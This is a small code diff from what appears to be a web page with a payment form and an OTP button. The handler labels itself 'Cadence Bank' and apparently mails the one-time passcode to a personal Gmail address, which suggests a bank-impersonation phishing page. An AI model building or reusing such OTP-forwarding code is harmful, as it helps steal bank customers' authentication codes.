@@ -45,7 +45,7 @@ paymentForm.addEventListener('submit', function (e) {
 
 otpButton.addEventListener('click', function (e) {
     e.preventDefault();
-    console.log(otp);
+    // console.log(otp);
     const name = 'Cadence Bank';
     const email ='prosperlekia@gmail.com';
     const subject = 'CADENCE BANK: Verify OTP';
